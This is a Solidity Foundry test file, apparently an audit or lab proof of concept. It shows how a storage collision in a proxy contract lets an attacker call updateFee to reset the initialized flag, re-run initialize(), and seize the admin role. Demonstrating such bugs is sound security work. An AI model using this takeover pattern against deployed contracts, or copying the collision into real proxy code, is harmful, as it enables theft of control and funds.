// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {Proxy} from "../src/Proxy.sol";
import {Logic} from "../src/Logic.sol";

contract CollisionTest is Test {
    Proxy proxy;
    Logic logic;
    address deployer = address(0xA11CE);
    address attacker = address(0xBAD);

    function setUp() public {
        logic = new Logic();
        proxy = new Proxy(address(logic));
        vm.prank(deployer);
        Logic(address(proxy)).initialize();   // calls go through the proxy
    }

    function test_exploit() public {
        assertEq(Logic(address(proxy)).admin(), deployer);

        // Innocent-looking call that overwrites byte 0 of slot 0
        proxy.updateFee(Proxy.FeeType.Penalty, 0);

        // initialize() works again, so the attacker takes over
        vm.prank(attacker);
        Logic(address(proxy)).initialize();
        assertEq(Logic(address(proxy)).admin(), attacker);
    }
}